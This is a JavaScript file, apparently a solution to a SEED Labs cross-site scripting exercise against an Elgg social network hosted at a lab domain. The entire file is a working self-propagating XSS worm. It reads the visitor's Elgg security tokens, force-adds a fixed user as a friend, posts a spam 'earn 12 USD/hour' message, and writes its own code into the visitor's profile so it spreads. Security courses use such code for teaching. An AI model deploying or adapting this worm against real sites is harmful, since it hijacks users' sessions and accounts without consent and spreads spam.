window.onload = function () {
    var Ajax=null;
    var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
    var token="&__elgg_token="+elgg.security.token.__elgg_token;
    var owner_id=elgg.page_owner.guid;
    var visitor_id=elgg.session.user.guid;
    var samy_id=59;
    var sendurl="http://www.seed-server.com/action/friends/add?friend="+samy_id+ts+ts+token+token;

    var sendurl2="http://www.seed-server.com/action/thewire/add";
    var owner_url=elgg.session.user.url;
    var body="&body=To earn 12 USD/hour(!), Visit Now\n"+owner_url;
    var content=token+ts+body; //FILL IN
    if (owner_id!=visitor_id){
        Ajax=new XMLHttpRequest();
        Ajax.open("GET",sendurl,true);
        Ajax.setRequestHeader("Host","www.seed-server.com");
        Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
        Ajax.send();

        Ajax=new XMLHttpRequest();
        Ajax.open("POST",sendurl2,true);
        Ajax.setRequestHeader("Host","www.seed-server.com");
        Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
        Ajax.send(content);

        var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
        var jsCode = document.getElementById("worm").innerHTML;
        var tailTag = "</" + "script>";
        var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
        var sendurl3="http://www.seed-server.com/action/profile/edit";
        var name="&name="+elgg.session.user.name;
        var description2="&description="+wormCode;
        var guid="&guid="+elgg.session.user.guid;
        var content=token+ts+name+description2+guid;

        Ajax=new XMLHttpRequest();
        Ajax.open("POST",sendurl3,true);
        Ajax.setRequestHeader("Host","www.seed-server.com");
        Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
        Ajax.send(content);
    }
}